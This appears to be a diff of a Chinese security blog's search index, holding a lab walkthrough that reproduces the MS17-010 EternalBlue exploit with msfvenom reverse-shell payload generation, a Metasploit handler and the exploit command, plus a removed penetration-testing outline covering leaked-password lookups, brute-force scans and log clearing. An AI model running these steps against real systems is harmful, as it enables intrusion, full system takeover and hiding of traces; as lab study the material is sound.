@@ -26,81 +26,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
-<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
-<p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
-<p>关闭靶机防火墙</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
-<p>在window server 2012中启动Guest账号</p>
-<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
-<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
-<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
-<p>下载到kali后后使用NASM工具对asm代码编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
-<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
-<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
-<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
-<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
-<p>保存退出，然后运行该脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
-<p>运行成功，此时返回msf命令行</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
-<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mysql的自动类型转换</title>
-    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
-    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
-<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
-<p><code>DVWA</code>的<code>user</code>表👆</p>
-<p>在进行以下查询时结果如图：</p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
-<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
-<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
-<p>而转换的规则也很有意思。</p>
-<p>‘1 and 1=1’ 被当作 1</p>
-<p>‘1 and 1=2’ 也被当作1</p>
-<p>‘2 and 1=1’ 被当作2</p>
-<p>经过更多的测试可以发现</p>
-<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
-<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
-<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
-<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>mysql</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>在Markdown中使用emoji表情</title>
     <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
     <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
@@ -204,192 +129,79 @@
       </tags>
   </entry>
   <entry>
-    <title>渗透测试基础</title>
-    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
-<p><strong>信息收集</strong></p>
-<p>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
-<p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
-<p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
-<p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
-<p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
-<p>f、google hack 进一步探测网站的信息，后台，敏感文件</p>
-<p><strong>漏洞扫描</strong></p>
-<p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
-<p><strong>漏洞利用</strong></p>
-<p>利用以上的方式拿到webshell，或者其他权限</p>
-<p><strong>权限提升</strong></p>
-<p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
-<p><strong>日志清理</strong></p>
-<p>总结报告及修复方案</p>
-<h2 id="资产搜集"><a class="header-anchor" href="#资产搜集"></a>资产搜集</h2>
-<h3 id="子域名搜集"><a class="header-anchor" href="#子域名搜集"></a>子域名搜集</h3>
-<ul>
-<li>工具1：Layer子域名挖掘机5.0
-<ul>
-<li>支持服务接口、暴力搜索、同服挖掘三种模式</li>
-<li>支持打开网站、复制域名、复制IP、复制CDN</li>
-<li>支持导出检测结果等功能</li>
-</ul>
-</li>
-<li>工具2：SubdomainsBurte
-<ul>
-<li><a href="https://github.com/y1ng1996/lijiejie_subDomainsBrute">https://github.com/y1ng1996/lijiejie_subDomainsBrute</a></li>
-<li>暴力枚举，速度快</li>
-</ul>
-</li>
-<li>网站：SSL证书查询\网络空间搜索引擎
-<ul>
-<li><a href="https://censys.io">censys</a></li>
-<li><a href="https://crt.sh">crt.sh</a></li>
-<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
-<li><a href="https://www.shodan.io/">shodan</a></li>
-<li><a href="https://fofa.so/">fofa</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="绕过CDN找真实IP"><a class="header-anchor" href="#绕过CDN找真实IP"></a>绕过CDN找真实IP</h3>
-<ul>
-<li>网络空间搜索引擎
-<ul>
-<li><a href="https://www.zoomeye.org/">钟馗之眼</a></li>
-<li><a href="https://www.webscan.cc/">webscan</a></li>
-<li><a href="https://censys.io">censys</a></li>
-<li><a href="https://www.shodan.io/">shodan</a></li>
-<li><a href="https://www.dnsdb.io/zh-cn">全球DNS搜索引擎</a></li>
-<li><a href="https://fofa.so/">fofa</a></li>
-<li><a href="http://lookahead.surfwax.com/">Surfwax元搜索</a></li>
-<li><a href="https://archive.org/web/">Way Back Machine</a></li>
-</ul>
-</li>
-<li>让目标主动连接我们
-<ul>
-<li>RSS订阅</li>
-<li>邮件服务器</li>
-</ul>
-</li>
-</ul>
-<h3 id="IP段整理"><a class="header-anchor" href="#IP段整理"></a>IP段整理</h3>
-<ul>
-<li>通过<a href="http://ipwhois.cnnic.net.cn/">中国互联网络信息中心</a>查询</li>
-<li>纯真IP数据库</li>
-</ul>
-<h3 id="C段查询、旁站查询"><a class="header-anchor" href="#C段查询、旁站查询"></a>C段查询、旁站查询</h3>
-<ul>
-<li><a href="https://www.webscan.cc/">webscan</a></li>
-</ul>
-<h2 id="端口扫描及利用"><a class="header-anchor" href="#端口扫描及利用"></a>端口扫描及利用</h2>
-<table>
-<thead>
-<tr>
-<th>端口号</th>
-<th>对应服务</th>
-<th>端口号</th>
-<th>对应服务</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>21</td>
-<td>ftp</td>
-<td>2601 2604</td>
-<td>zebra路由</td>
-</tr>
-<tr>
-<td>22</td>
-<td>ssh</td>
-<td>3306</td>
-<td>MySQL</td>
-</tr>
-<tr>
-<td>23</td>
-<td>telnet</td>
-<td>3312</td>
-<td>kangle主机管理系统</td>
-</tr>
-<tr>
-<td>80</td>
-<td>http</td>
-<td>3389</td>
-<td>远程桌面</td>
-</tr>
-<tr>
-<td>80-89</td>
-<td>web</td>
-<td>4440</td>
-<td>rundeck</td>
-</tr>
-<tr>
-<td>161</td>
-<td>snmp</td>
-<td>5432</td>
-<td>PostgreSQL</td>
-</tr>
-<tr>
-<td>389</td>
-<td>LDAP</td>
-<td>5900</td>
-<td>vnc</td>
-</tr>
-<tr>
-<td>443</td>
-<td>https（心脏滴血）</td>
-<td>6379</td>
-<td>redis未授权</td>
-</tr>
-<tr>
-<td>445</td>
-<td>SMB（永恒之蓝）</td>
-<td>7001 7002</td>
-<td>WebLogic默认弱口令，反序列</td>
-</tr>
-<tr>
-<td>512 513 514</td>
-<td>Rexec</td>
-<td>8080</td>
-<td>tomcat</td>
-</tr>
-<tr>
-<td>873</td>
-<td>Rsync未授权</td>
-<td>8080 8089 9090</td>
-<td>JBOSS</td>
-</tr>
-<tr>
-<td>1025</td>
-<td>NFS</td>
-<td>8161</td>
-<td>activemq未授权访问</td>
-</tr>
-<tr>
-<td>1433</td>
-<td>MSSQL</td>
-<td>27017 27018</td>
-<td>Mongodb未授权访问</td>
-</tr>
-<tr>
-<td>1521</td>
-<td>Oracle</td>
-<td>50000</td>
-<td>SAP命令执行</td>
-</tr>
-</tbody>
-</table>
-<p><strong>利用 nmap+脚本快速捡洞和检洞</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">系统漏洞检测：nmap --script smb-check-vulns.nse -p 192.168.1.1</span><br><span class="line">数据库密码检测：nmap --script=brute 192.168.1.1</span><br><span class="line">收集应用服务信息：nmap -sC 192.168.1.1</span><br><span class="line">检测常见漏洞：nmap --script=vuln 192.168.1.1</span><br><span class="line">检测部分应用的弱口令：nmap --script=auth 192.168.1.1</span><br></pre></td></tr></table></figure>
-<h2 id="指纹搜集"><a class="header-anchor" href="#指纹搜集"></a>指纹搜集</h2>
+    <title>mysql的自动类型转换</title>
+    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
+    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
+<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
+<p><code>DVWA</code>的<code>user</code>表👆</p>
+<p>在进行以下查询时结果如图：</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
+<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
+<p>而转换的规则也很有意思。</p>
+<p>‘1 and 1=1’ 被当作 1</p>
+<p>‘1 and 1=2’ 也被当作1</p>
+<p>‘2 and 1=1’ 被当作2</p>
+<p>经过更多的测试可以发现</p>
+<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
+<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
+<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
+<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>mysql</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
 ]]></content>
       <categories>
         <category>渗透</category>
       </categories>
-  </entry>
-  <entry>
-    <title>dark web</title>
-    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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